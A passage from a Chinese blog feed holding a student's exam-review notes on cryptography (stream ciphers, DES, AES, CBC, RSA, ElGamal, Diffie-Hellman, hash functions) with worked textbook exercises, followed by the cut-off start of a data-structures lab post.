id="liu-mi-ma">流密码</h1><h2 id="zhi-shi-dian-1" id="知识点-v2"><a class="header-anchor" href="#知识点-v2">¶</a>知识点</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200616202720122.png"  alt="image-20200616202720122"></p><p>1.==流密码的基本思想==：  (==必考！==)</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200616215215527.png"  alt="image-20200616215215527"></p><p>2.流密码中密钥流就等于明文串和密文串异或</p><p>3.移位寄存器是流密码产生密钥流的一个重要组成部分</p><p>4.m序列密码的破译就是求密钥流的递推关系即a<sub>m+i</sub>=c<sub>m</sub>ai⊕c<sub>m-1</sub>a<sub>i+1</sub>⊕…⊕c<sub>1</sub>a<sub>m+i-1</sub></p><p>(公式中的m即题目说多少级级线性反馈移位寄存器就是多少)</p><blockquote><p>比如是3级，我们求得是a<sub>i+3</sub>，当i=1，i+3=4即第四个这样根据前三个就可知道后面所有的数</p></blockquote><h2 id="xi-ti-1" id="习题-v2"><a class="header-anchor" href="#习题-v2">¶</a>习题</h2><p>1.求矩阵的逆（这章习题会用到，复习下）</p><p>核心公式：A<sup>-1</sup>=A<sup>*</sup>/|A|</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200609214703300.png"  alt="image-20200609214703300" style="zoom:80%;" /><p>若是三阶矩阵：A<sub>ij</sub>=(-1)<sup>i+j</sup>M<sub>ij</sub>，M<sub>ij</sub>为除去a<sub>ij</sub>所在那一行和那一列得到的二阶矩阵</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200609215140551.png"  alt="image-20200609215140551"></p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200609215521885.png"  alt="image-20200609215521885"></p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200609215736609.png"  alt="image-20200609215736609"></p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200609215941959.png"  alt="image-20200609215941959"></p><p>2.已知流密码的密文串1010110110和相应的明文串0100010001，而且还已知密钥流是使用3级线性反馈移位寄存器产生的，试破译该密码系统。(和P65例2-6类似)</p><p>答：由已知可得密钥流为1010110110⊕0100010001=1110100111，因为是3级线性反馈</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200609212249326.png"  alt="image-20200609212249326"></p><blockquote><p>按照上面矩阵：a<sub>4</sub>=c<sub>3</sub>*a<sub>1</sub>+c<sub>2</sub>*a<sub>2</sub>+c<sub>1</sub>*a<sub>3</sub>正是密钥流递推关系(m=3,i=1然后是m=3,i=2…)</p></blockquote><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200609214235084.png"  alt="image-20200609214235084"></p><blockquote><p>记住c从高到低，a从低到高</p></blockquote><p>3.如图是一个3级反馈移位寄存器，其初始状态为(a1,a2,a3)=(1,0,1)，求输出序列</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200609221112648.png"  alt="image-20200609221112648" style="zoom:80%;" /><p>从图中可看到a1、a2、a3经f函数送至左边形成一个循环，比如f(a1,a2,a3)=b，那么b将代替a3的位置，a3～a1均右移，所以a1输出，以此类推。</p><p>答：f(a1,a2,a3)=f(1,0,1)=1*0⊕1=1，然后f(1,1,0)</p><p>可总结规律，右边的3为参与f函数生成的数放在左边，然后以左边这个数向右数3个数分别当做a3,a2,a1参与f生成的又放在最左边…最后输出是从右到左</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/IMG_20200609_222216.jpg"  alt="IMG_20200609_222216" style="height:170px;" /><p>即输出序列为10111011101…，周期为4</p><h1 id="fen-zu-mi-ma">分组密码</h1><h2 id="zhi-shi-dian-2" id="知识点-v3"><a class="header-anchor" href="#知识点-v3">¶</a>知识点</h2><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200616202818895.png"  alt="image-20200616202818895" style="zoom:80%;" /><p>1.分组密码：将明文划分为长为n的组x(x0,x1,…,xn-1)，各组在密钥k=(k0,k1,…kt-1)控制下变换成等长的数字序列y=(y0,y1,…ym-1)。实质是对字长为n的数字序列的代换密码 （一般m=n）</p><p>2.扩散和混淆是Shannon提出的设计密码系统的两个基本方法(分组密码安全设计性原则)  (了解)</p><ul><li>扩散：使明文与密文之间的统计关系变得尽可能复杂，以使敌手无法得到密钥<ul><li>明文每一比特变换尽量多的影响密文序列的变化，以隐蔽明文的统计特性（雪崩效应）</li><li>P盒(置换)用于扩散</li></ul></li><li>混淆：使密文与密钥之间的统计关系变得尽可能复杂，以使敌手无法得到密钥<ul><li>S盒(代换)用于混淆</li></ul></li></ul><p>3.很多分组密码结构本质都基于Feistel结构</p><p>将每组明文分为左右两半L<sub>0</sub>和R<sub>0</sub>，n轮迭代后再合在一起产生密文分组</p><p>第i轮迭代（代换）：      L<sub>i</sub>=R<sub>i-1</sub>  (左等右上)             R<sub>i</sub>=L<sub>i-1</sub>⊕F(R<sub>i-1</sub>,K<sub>i</sub>)  （右等左上异或F即右上和K）</p><p>最后一轮交换左右两半数据（置换用于扩散）</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200614145605923.png"  alt="image-20200614145605923" style="zoom: 80%;" /><p>解密和加密本质过程一样，密文作为输入，但使用子密钥K<sub>i</sub>的次序和加密相反（这一特性保证了加密和解密可用同一算法）</p><p>4.DES加密过程可分为四个阶段 (64比特明文，64比特密钥(每个第8位设置奇偶校验位实际56位)）</p><ul><li>初始置换IP，用于重排明文分组的64比特         （由IP置换表实现）</li><li>生成子密钥</li><li>迭代过程即16轮变换然后交换左右次序(代换和置换)</li><li>逆初始置换IP<sup>-1</sup></li></ul><p>:two: 生成子密钥过程                参考：<a href="https://www.cxyxiaowu.com/1478.html" target="_blank" rel="noopener">算法科普：神秘的 DES 加密算法</a> ，下同</p><p>56比特密钥经PC-1置换后分为左右C<sub>0</sub>和D<sub>0</sub>，然后由表左循环经PC-2产生48比特的本轮密钥</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/1571057977-17488ca32598db6.jpg"  alt="image-20200614145605923" style="zoom: 80%;" /><p>:three: 迭代过程等同于Feistel结构(左等右上，右等左上异或F)，而其中用到的F函数为：</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200614155257147.png"  alt="image-20200614155257147" style="zoom:67%;" /><p>5.分组密码的运行模式</p><ul><li>ECB(电话本)模式                      各明文组以同一密钥加密</li><li><strong>CBC(密码分组链接)模式</strong>          加密的输入是当前明文组和前一密文组的异或</li><li>CFB(密码反馈)模式                  每次处理j位输入，上次密文加密产生伪随机再与当前明文异或</li><li>OFB(输出反馈)模式           与CFB不同的是加密的输入是前一次加密的输出(与明文异或的那个)</li></ul><p>:two: ==CBC模式加解密示意图== （==必考！==）</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200614163017246.png"  alt="image-20200614163017246" style="height:450px" /><p>加密: C<sub>i</sub>= E<sub>k</sub>[P<sub>i</sub>⊕C<sub>i-1</sub>] (可认为C<sub>0</sub>=IV)         解密:P<sub>i</sub>= D<sub>K</sub>[C<sub>i</sub>]⊕C<sub>i-1</sub></p><blockquote><p>IV初始向量与第一个明文分组异或，应像密钥一样被保护。该模式能够获得保密性也可认证，适合加密64比特的消息</p></blockquote><p>==工作模式为==：它一次对一个明文分组加密，每次加密使用同一密钥，加密算法的输入是当前明文分组和前一次密文分组的异或，因此加密算法的输入不会显示出这次的明文分组之间的固定关系，所以重复的明文分组不会在密文中暴露出这种重复关系                   （==必须背会！==）</p><p>6.AES是DES的替代者，也是当今最流行的对称加密算法之一</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/20190527200618151.png"   /><p>AES轮函数包括字节代换、行移位、列混合、密钥加</p><p>:one: 字节代换：根据S盒把明文块的每一个字节都替代成另外一个字节</p><p>:two: 行移位：如第1行不变，第2行循环左移C1个字节，第3行左移C2个字节，第4行移C3 要根据表</p><p>:three: 列混合：输入数组每一列和修补矩阵的二维常量数组做矩阵相乘，得到对应的输出列。</p><p>:four: 密钥加：输入数组的每个字节a[i,j]与密钥对应位置的字节k[i,j]异或一次，就生成了输出值b[i,j]</p><p>7.SM4算法，数据和密码分组均为128比特</p><p>加密：X<sub>i</sub>+4=F(X<sub>i</sub>,X<sub>i+1</sub>,X<sub>i+2</sub>,X<sub>i+3</sub>,rk<sub>i</sub>)=X<sub>i</sub>⊕T(X<sub>i+1</sub>⊕X<sub>i+2</sub>⊕X<sub>i+3</sub>⊕rk<sub>i</sub>)（i=0,1,2…31）</p><p>后经反序R处理：(Y<sub>0</sub>,Y<sub>1</sub>,Y<sub>2</sub>,Y<sub>3</sub>)=(X<sub>35</sub>,X<sub>34</sub>,X<sub>33</sub>,X<sub>32</sub>)=R(X<sub>32</sub>,X<sub>33</sub>,X<sub>34</sub>,X<sub>35</sub>)</p><p>解密算法和加密算法相同，轮密钥使用顺序相反</p><p><a href="http://8.GF" target="_blank" rel="noopener">8.GF</a>(2<sup>8</sup>)中   a*a<sup>-1</sup>=1(mod x8+x4+x5+x+1)</p><p>GF(2)上的可逆的仿射变换 如下 （x是题目中a的逆）</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200614205335632.png"  alt="image-20200614205335632"></p><h2 id="xi-ti-2" id="习题-v3"><a class="header-anchor" href="#习题-v3">¶</a>习题</h2><p>1.==对字节a=1011  0110字节替代变换，设a的逆为a<sup>-1</sup>==                 （ ==必考！==）</p><p>答：先求a的逆，再用仿射变换即可</p><p>:one: 由a得(x<sup>7</sup>+x<sup>5</sup>+x<sup>4</sup>+x<sup>2</sup>+x)a<sup>-1</sup> ≡ 1(mod x<sup>8</sup>+x<sup>4</sup>+x<sup>3</sup>+x+1)</p><p>所以a<sup>-1</sup>=x<sup>6</sup>+x<sup>5</sup>+x<sup>4</sup>+x<sup>3</sup>             即0111 1000     （二进制对应位数有1就代表有x的那一次方）</p><blockquote><p>根据老师给的考试要点，仿射变换和m(x)题目会给出，a的逆试试就出来了</p></blockquote><p>:two: 使用仿射变换   （注意要用a的逆而且注意x的顺序从下往上读）</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/QQ%E5%9B%BE%E7%89%8720200614210639.jpg"  alt="QQ图片20200614210639"></p><p>即(0100 1110)<sub>2</sub>=(4E)<sub>16</sub>                 注意也是从下开始读  因为最下面的是字节高位即最前面的01…</p><p>2.利用DES算法和全0密钥对输入(1000 0001 1960 0000)进行一圈加密的结果 （需要查表P39）</p><p>答：:one: 输入的右半部分是1960 0000 = 0001 1001 0110 0000    0000 0000 0000 0000</p><p>:two: 经E盒扩展后为：000011 110010 101100 000000      000000 000000 000000 000000</p><p>:three: 与全0密钥对异或后为：000011 110010 101100 000000      000000 000000 000000 000000</p><p>:four: 经S盒后变为：15 8 3 7 2 12 4 13 即1111 1000 0011 0111 0010 1100 0100 1101</p><p>:five: 经P盒后变为 1001 1100 1101 1000     1001 1010 1010 1110</p><p>:six: 输出的左半部分即输入的右半部分为1960 0000，输出的右半部分为F函数输出和左半部分输入异或即8cd8 9aaf，最终输出为 1960 0000  8cd8 9aaf</p><blockquote><p>这题主要是加深对DES迭代过程的理解，由于要查表，考试应该不会考</p></blockquote><p>3.在DES的ECB模式中,如果在密文分组中有一个错误,解密后仅相应的明文分组受到影响。然而在CBC模式中，将有错误传播。加密解密图中C1中的一个错误明显地将影响到P1和P2的结果。</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200614163017246.png"  alt="image-20200614163017246" style="zoom: 50%;" /><p>(1) P2后的分组是否受到影响?<br>(2)设加密前的明文分组P1中有1比特的错误，问这一错误将在多少个密文分组中传播?<br>对接收者产生什么影响?</p><p>答：:one: CBC的加密: C<sub>i</sub>= E<sub>k</sub>[P<sub>i</sub>⊕C<sub>i-1</sub>]，i≥2           解密:P<sub>i</sub>= D<sub>K</sub>[C<sub>i</sub>]⊕C<sub>i-1</sub>，i≥1</p><p>若C1有错误，P2=D<sub>K</sub>[C<sub>2</sub>]⊕C<sub>1</sub>所以P2也会受影响，但i≥3时，P<sub>i</sub>= D<sub>K</sub>[C<sub>i</sub>]⊕C<sub>i-1</sub>与C1无关因此不会受到影响</p><blockquote><p>本题由于C1错误事实上C2、C3、C4…都会和原来不一样，但即使它是错的经密钥解密后还是可以得到原明文(可理解为是明文的另一种加密结果)，所以说P2后不受影响</p></blockquote><p>:two: 若P1出错，则C1会是错的，由C<sub>i</sub>= E<sub>k</sub>[P<sub>i</sub>⊕C<sub>i-1</sub>]得，C<sub>i≥2</sub>也都是错误的，因此会传递到每一个分组</p><p>由加密解密方式可知，若只是P1出错，解密后得到的还是原来的输入。即接收者解密后的P1和原来输入的一样会有1比特的错误，而其他的可以解密得到正确的明文</p><h1 id="gong-yao-mi-ma">公钥密码</h1><h2 id="zhi-shi-dian-3" id="知识点-v4"><a class="header-anchor" href="#知识点-v4">¶</a>知识点</h2><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200616203037349.png"  alt="image-20200616203037349" style="zoom:80%;" /><p>1.==RSA加密解密==      (==必考！==)</p><p>选倆素数p,q       n=p*q      φ(n)=(p-1)*(q-1)            d*e ≡ 1 mod φ(n)</p><p>加密：c ≡ m<sup>e</sup> mod n    （e和n会给出）</p><p>解密：m ≡ c<sup>d</sup> mod n      (一般d要自己求)</p><p>2.可能会用到的公式：a*b (mod q) = a (mod q) * b (mod q)</p><blockquote><p>推测是RSA中m<sup>e</sup>或c<sup>d</sup>可以拆成两个乘积的形式</p></blockquote><h2 id="xi-ti-3" id="习题-v4"><a class="header-anchor" href="#习题-v4">¶</a>习题</h2><p>1.==RSA加密体制中，接收方的公开钥是(e,n)=(5,35)，接收到的密文是C=10，求明文M== （==必考！==）</p><p>答：（    m ≡ c<sup>d</sup> mod n         所以得先算出d  -----&gt; d*e ≡ 1 mod φ(n)  ）</p><p>n=35             所以 p=5，q=7</p><p>φ(35) = (p-1)*(q-1) =4*6=24</p><p>因为 d*e ≡ 1 mod φ(n)   所以d=5      （这个到时候一个一个试就行）</p><p>m ≡ c<sup>d</sup> mod n ≡ 10<sup>5</sup> mod 35 ≡ 5          （注意不是等号）</p><p>2.==假设明文m=5，e=7，p=11，q=13，给出RSA的加密解密过程==     （==必考！==）</p><p>答：n=p*q=11*13=143           φ(143) = (p-1)*(q-1) = 10*12=120</p><p>因为d*e ≡ 1 mod φ(n)  即d*7 ≡ 1 mod 120   所以 d=103</p><p>加密：c ≡ m<sup>e</sup> mod n  ≡ 5<sup>7</sup> ≡ 47 mod 143</p><p>解密：m ≡ c<sup>d</sup> mod n  ≡ 47<sup>103</sup> ≡ 5 mod 143</p><h1 id="shu-zi-qian-ming">数字签名</h1><h2 id="zhi-shi-dian-4" id="知识点-v5"><a class="header-anchor" href="#知识点-v5">¶</a>知识点</h2><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200616210115666.png"  alt="image-20200616210115744" style="zoom:80%;" /><p>1.==ElGamal签名体制：==                       （==必考！==）</p><p>用户A的公钥：y ≡ g<sup>x</sup>  (mod p)          x为用户A的私钥</p><p>签名的产生过程：</p><ul><li>计算 r ≡ g<sup>k</sup>  (mod p)</li><li>计算 s ≡ (H(m)-xr)k<sup>-1</sup> (mod p-1)           H(m)为m的哈希值，计算取H(m)=m，注意是p-1</li><li>(r,s)即为签名</li></ul><p>签名的验证过程</p><ul><li>计算y<sup>r</sup>r<sup>s</sup> ≡ g<sup>H(m)</sup> (mod p)</li><li>就是验证 y<sup>r</sup>r<sup>s</sup>（mod p）是不是等于 g<sup>H(m)</sup> (mod p)</li></ul><h2 id="xi-ti-4" id="习题-v5"><a class="header-anchor" href="#习题-v5">¶</a>习题</h2><p>1.ElGamal签名体制中，假设p=19，g=13。签名者A的私钥为x = 10，试计算公钥。设消息M=15，k=11，求签名过程并验证。  (==必考！==)</p><p>答：公钥：y ≡ g<sup>x</sup> mod p ≡ 13<sup>10</sup> mod 19 = 6</p><p>签名：r ≡ g<sup>k</sup>  (mod p) ≡ 13<sup>11</sup> mod 19 =2</p><p>s ≡ (H(m)-xr)k<sup>-1</sup> (mod p-1) ≡ (m-xr)k<sup>-1</sup> (mod p-1) ≡ (15-10*2)*11<sup>-1</sup> mod 18 = 11</p><p>所以(r,s)=(2,11)</p><p>验证：y<sup>r</sup>r<sup>s</sup> ≡ 6<sup>2</sup>*2<sup>11</sup> mod 19 ≡ 8 ≡ g<sup>m</sup> (mod p) ≡ 13<sup>15</sup> ≡ 8 mod 19</p><blockquote><p>根据老师的重点中给出的a*b (mod q) = a (mod q) * b (mod q)应该是用在比如这题求6<sup>2</sup>*2<sup>11</sup> mod 19就等同于求6<sup>2</sup> mod 19 * 2<sup>11</sup> mod 19 ≡ 17 *15 ≡ 8 mod 19</p></blockquote><h1 id="ha-xi-han-shu">哈希函数</h1><h2 id="zhi-shi-dian-5" id="知识点-v6"><a class="header-anchor" href="#知识点-v6">¶</a>知识点</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200616215652197.png"  alt="image-20200616215652197"></p><p>1.单向函数：已知h，求使得H(x)=h的x在计算上是不可行的。</p><p>2.==弱单向哈希函数和强单向哈希函数==            （==必考！==）</p><p>已知x，找出y (y≠x) 使得H(y)=H(x)在计算上是不可行的，若单向函数满足这种性质则称其为弱单向哈希函数         （==必须会背！==）</p><p>找出任意两个不同的输入x、y，使得H(x)=H(y)在计算上是不可行的，若单向函数满足这种性质则称其为强单向哈希函数                  （==必须会背！==）</p><blockquote><p>已知一个另找一个使得H函数相等是弱单向，任意给倆使其H函数相等是强单向（看谁单的很）</p></blockquote><p>3.如果哈希函数对不同的输入可产生相同的输出，则称该函数具有碰撞性。</p><p>4.抗弱碰撞哈希函数：对于任意给定的x，找到满足y≠x且H(x)=H(y)的y在计算上是不可行的</p><p>抗强碰撞哈希函数：找到任何满足H(x)=H(y)的x,y在计算上是不可行的</p><h1 id="ren-zheng-ji-zhu">认证技术</h1><h2 id="zhi-shi-dian-6" id="知识点-v7"><a class="header-anchor" href="#知识点-v7">¶</a>知识点</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200616221851197.png"  alt="image-20200616221851197"></p><p>1.消息认证是一个过程，用于验证接收消息的真实性(确实是它声称的实体发来的)和完整性(未被篡改、插入、删除)，同时还用于验证消息的顺序性和时间性(未重排、重放、延迟)以及消息的不可否认性。</p><h1 id="mi-yao-fen-pei-yu-mi-yao-guan-li">密钥分配与密钥管理</h1><h2 id="zhi-shi-dian-7" id="知识点-v8"><a class="header-anchor" href="#知识点-v8">¶</a>知识点</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200616222510012.png"  alt="image-20200616222510012"></p><p>1.Diffie-Hellman密钥交换简称D-H密钥交换的目的是使得两个用户能够安全的交换密钥，得到一个共享的会话密钥，算法本身不能用于加密解密。</p><p>2.==D-H密钥交换协议==：                            （==必考！==）</p><p>已知私钥为X，公钥为Y，p是一大素数，a是p的本原根，a和p公开，K为共享密钥</p><p>用户A：计算Y<sub>A</sub>=a<sup>XA</sup> mod p发送给B         共享密钥K=Y<sub>B</sub><sup>XA</sup> mod p</p><p>用户B：计算Y<sub>B</sub>=a<sup>XB</sup> mod p发送给A         共享密钥K=Y<sub>A</sub><sup>XB</sup> mod p</p><blockquote><p>通过上述操作求得的两个K值相等，这样就安全的求得了一个公共的密钥</p></blockquote><h2 id="xi-ti-5" id="习题-v6"><a class="header-anchor" href="#习题-v6">¶</a>习题</h2><p>1.在Diffie- Hellman密钥交换过程中，设大素数p=11,a=2是p的本原根。  （==必考！==）<br>(1) 用户A的公开钥Y<sub>A</sub>=9,求其秘密钥XA。<br>(2)设用户B的公开钥Y<sub>B</sub>=3,求A和B的共享密钥K。</p><p>答：:one: Y<sub>A</sub>=a<sup>XA</sup> mod p = a<sup>XA</sup> mod p 即 9=2<sup>XA</sup> mod 11   所以 X<sub>A</sub>=6  (考试时一个一个试就行)</p><p>:two: K=Y<sub>B</sub><sup>XA</sup> mod p = 3<sup>6</sup> mod 11 =3</p><h1 id="mi-ma-xie-yi">密码协议</h1><h2 id="zhi-shi-dian-8" id="知识点-v9"><a class="header-anchor" href="#知识点-v9">¶</a>知识点</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200616230655359.png"  alt="image-20200616230655359"></p><p>1.密码协议是指利用密码工具实现与安全相关的协议或函数的计算</p><h1 id="ke-zheng-ming-an-quan">可证明安全</h1><h2 id="zhi-shi-dian-9" id="知识点-v10"><a class="header-anchor" href="#知识点-v10">¶</a>知识点</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200616231333668.png"  alt="image-20200616231333668"></p><p>1.可证明安全性：将密码系统的安全性归结为某个经过深入研究的数学难题（如大整数素因子分解、计算离散对数等），数学难题被证明求解困难。这种评估方法存在的问题是它只说明了这个密码方法的安全性与某个困难问题相关，没有完全证明问题本身的安全性。</p><h1 id="mi-ma-xue-xin-fang-xiang">密码学新方向</h1><h2 id="zhi-shi-dian-10" id="知识点-v11"><a class="header-anchor" href="#知识点-v11">¶</a>知识点</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200616231741030.png"  alt="image-20200616231741030"></p><p>1.写出5中密码学新方向或新技术       （==必考！==）</p><p>答：身份基加密(IBE)、属性基加密(ABE)、全同态加密、动态加密、可搜索加密</p><h1 id="ji-suan-gong-shi">计算公式</h1><p>1.==RSA加密解密==      (==必考！==)</p><p>选倆素数p,q       n=p*q      φ(n)=(p-1)*(q-1)            d*e ≡ 1 mod φ(n)</p><p>加密：c ≡ m<sup>e</sup> mod n    （e和n会给出）</p><p>解密：m ≡ c<sup>d</sup> mod n      (一般d要自己求)</p><p>2.==ElGamal签名体制：==                       （==必考！==）</p><p>用户A的公钥：y ≡ g<sup>x</sup>  (mod p)          x为用户A的私钥 （公钥要和私钥有关所以用x）</p><p>签名的产生过程：</p><ul><li>计算 r ≡ g<sup>k</sup>  (mod p)</li><li>计算 s ≡ (H(m)-xr)k<sup>-1</sup> (mod p-1)           H(m)为m的哈希值，计算取H(m)=m，==注意是p-1==</li><li>(r,s)即为签名</li></ul><p>签名的验证过程</p><ul><li>计算y<sup>r</sup>r<sup>s</sup> ≡ g<sup>H(m)</sup> (mod p)   （上面先后算出y,r,s所以是y<sup>r</sup>r<sup>s</sup>）</li><li>就是验证 y<sup>r</sup>r<sup>s</sup>（mod p）是不是等于 g<sup>H(m)</sup> (mod p)</li></ul><p>3.==D-H密钥交换协议==：                            （==必考！==）</p><p>已知私钥为X，公钥为Y，p是一大素数，a是p的本原根，a和p公开，K为共享密钥</p><p>用户A：计算Y<sub>A</sub>=a<sup>XA</sup> mod p发送给B         共享密钥K=Y<sub>B</sub><sup>XA</sup> mod p</p><p>用户B：计算Y<sub>B</sub>=a<sup>XB</sup> mod p发送给A         共享密钥K=Y<sub>A</sub><sup>XB</sup> mod p</p><blockquote><p>通过上述操作求得的两个K值相等，这样就安全的求得了一个公共的密钥</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;xie-zai-qian-mian&quot;&gt;写在前面&lt;/h1&gt;
&lt;p&gt;由于老师后来给画了重点，本篇博客后半部分主要记录的是老师画的重点。个人复习使用，仅供参考&lt;/p&gt;
&lt;p&gt;对于河南大学的学弟学妹们，如果你们任课老师是袁老师的话，他会给复习要点，跟着复习要点有针对性的复
      
    
    </summary>
    
    
      <category term="计算机专业课" scheme="http://zssblog.top/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E8%AF%BE/"/>
    
    
      <category term="计算机专业课" scheme="http://zssblog.top/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E8%AF%BE/"/>
    
  </entry>
  
  <entry>
    <title>实验六 查找和排序的实现</title>
    <link href="http://zssblog.top/2020/06/12/%E5%AE%9E%E9%AA%8C%E5%85%AD-%E6%9F%A5%E6%89%BE%E5%92%8C%E6%8E%92%E5%BA%8F%E7%9A%84%E5%AE%9E%E7%8E%B0/"/>
    <id>http://zssblog.top/2020/06/12/%E5%AE%9E%E9%AA%8C%E5%85%AD-%E6%9F%A5%E6%89%BE%E5%92%8C%E6%8E%92%E5%BA%8F%E7%9A%84%E5%AE%9E%E7%8E%B0/</id>
    <published>2020-06-12T04:13:00.000Z</published>
    <updated>2020-06-12T04:14:50.796Z</updated>
    
    <content type="html"><![CDATA[<h1 id="shi-yan-xing-zhi-zong-he-xing-shi-yan">实验性质：综合性实验</h1><h1 id="yao-qiu">要求：</h1><p>（1）采用邻接矩阵/邻接表建立图；<br>（2）采用深度优先/广度优先搜索方式遍历图；<br>（3）编程实现Dijkstra最短路径算法。</p><h1 id="mu-de">目的：</h1><p>（1）掌握图的邻接矩阵和邻接表存储方式；<br>（2）掌握图的遍历算法；<br>（3）掌握图的实际应用——最短路径算法。</p><h1 id="dai-ma">代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span 